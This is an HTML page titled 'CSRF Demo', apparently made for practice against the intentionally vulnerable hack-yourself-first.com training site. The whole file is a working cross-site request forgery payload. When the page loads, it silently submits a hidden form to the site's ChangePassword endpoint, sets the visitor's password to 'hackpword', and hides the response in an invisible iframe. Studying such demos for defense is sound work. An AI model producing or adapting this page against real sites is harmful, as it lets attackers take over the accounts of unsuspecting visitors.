<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>csrf</title>
</head>
<body onload="document.csrfForm.submit()">
    <h1>CSRF Demo</h1>
    
    <form action="https://hack-yourself-first.com/Account/ChangePassword" method="POST" target="hiddenFrame" name="csrfForm">
      <input type="hidden" name="NewPassword" value="hackpword">
      <input type="hidden" name="ConfirmPassword" value="hackpword">
    </form>
    
    <iframe name="hiddenFrame" style="display: none;"></iframe>
</body>
</html>
